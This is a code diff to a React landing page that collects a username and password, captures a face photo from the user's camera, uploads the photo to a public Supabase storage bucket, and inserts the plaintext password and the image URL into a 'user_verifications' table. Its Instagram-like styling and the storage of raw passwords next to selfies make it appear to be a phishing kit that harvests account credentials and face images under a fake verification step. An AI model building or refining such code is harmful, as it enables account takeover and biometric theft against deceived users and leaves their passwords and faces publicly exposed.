@@ -25,7 +25,7 @@ export default function Landing() {
   const [screen, setScreen] = useState<Screen>(1);
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [capturedImage, setCapturedImage] = useState<string | null>(null);
+  const [capturedImage, setCapturedImage] = useState<Blob | null>(null);
 
   return (
     <div className="min-h-[100dvh] bg-[#1C2A33] flex items-center justify-center">
@@ -230,7 +230,7 @@ function Screen2({ onBack, onNext }: { onBack: () => void; onNext: () => void })
 /* ─────────────────────────────────────────────
    SCREEN 3 — Live Camera Capture + Face Detection
    ───────────────────────────────────────────── */
-function Screen3({ onSuccess }: { onSuccess: (capturedImage: string) => void }) {
+function Screen3({ onSuccess }: { onSuccess: (capturedImage: Blob) => void }) {
   const videoRef = useRef<HTMLVideoElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const rafRef = useRef<number>(0);
@@ -367,7 +367,6 @@ function Screen3({ onSuccess }: { onSuccess: (capturedImage: string) => void }) 
               // Delay capture to ensure the video frame is fully rendered
               setTimeout(() => {
                 const videoEl = videoRef.current;
-                let base64Image = "";
                 if (
                   videoEl &&
                   videoEl.readyState === 4 &&
@@ -382,17 +381,27 @@ function Screen3({ onSuccess }: { onSuccess: (capturedImage: string) => void }) 
                     ctx.translate(canvas.width, 0);
                     ctx.scale(-1, 1);
                     ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-                    base64Image = canvas.toDataURL("image/jpeg", 0.9);
+                    canvas.toBlob((blob) => {
+                      // Stop camera and transition after spinner delay
+                      setTimeout(() => {
+                        if (streamRef.current) {
+                          streamRef.current.getTracks().forEach((t) => t.stop());
+                          streamRef.current = null;
+                        }
+                        if (blob) {
+                          onSuccess(blob);
+                        }
+                      }, 1300);
+                    }, "image/jpeg", 0.9);
+                    return; // stop scheduling new frames — toBlob callback handles transition
                   }
                 }
-
-                // Allow time for spinner to show, then transition
+                // Fallback: no valid video — transition without image
                 setTimeout(() => {
                   if (streamRef.current) {
                     streamRef.current.getTracks().forEach((t) => t.stop());
                     streamRef.current = null;
                   }
-                  onSuccess(base64Image);
                 }, 1300);
               }, 500);
               return; // stop scheduling new frames
@@ -502,22 +511,48 @@ function Screen4({
   onSubmit: () => void;
   username: string;
   password: string;
-  faceImage: string | null;
+  faceImage: Blob | null;
 }) {
   const [submitting, setSubmitting] = useState(false);
 
   const handleSubmit = async () => {
+    if (!faceImage) {
+      alert("No face image captured. Please try again.");
+      return;
+    }
     setSubmitting(true);
-    const { error } = await supabase
+
+    // 1. Upload the Blob to Supabase Storage bucket "faces"
+    const fileName = `${username}-${Date.now()}.jpg`;
+    const { error: uploadError } = await supabase.storage
+      .from("faces")
+      .upload(fileName, faceImage, { contentType: "image/jpeg" });
+
+    if (uploadError) {
+      console.error("Storage upload error:", uploadError);
+      alert("Failed to upload face image. Please try again.");
+      setSubmitting(false);
+      return;
+    }
+
+    // 2. Get the public URL
+    const { data: urlData } = supabase.storage
+      .from("faces")
+      .getPublicUrl(fileName);
+    const publicUrl = urlData?.publicUrl || "";
+
+    // 3. Insert username, password, and the public URL into the database
+    const { error: dbError } = await supabase
       .from("user_verifications")
       .insert({
         username,
         password,
-        face_image: faceImage || "",
+        face_image: publicUrl,
       });
+
     setSubmitting(false);
-    if (error) {
-      console.error("Supabase insert error:", error);
+    if (dbError) {
+      console.error("Supabase insert error:", dbError);
       alert("Failed to submit verification. Please try again.");
       return;
     }
@@ -570,7 +605,7 @@ function Screen4({
           </p>
         </div>
         <button onClick={handleSubmit} disabled={submitting} className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors disabled:opacity-50">
-          Submit
+          {submitting ? "Uploading..." : "Submit"}
         </button>
       </div>
     </>
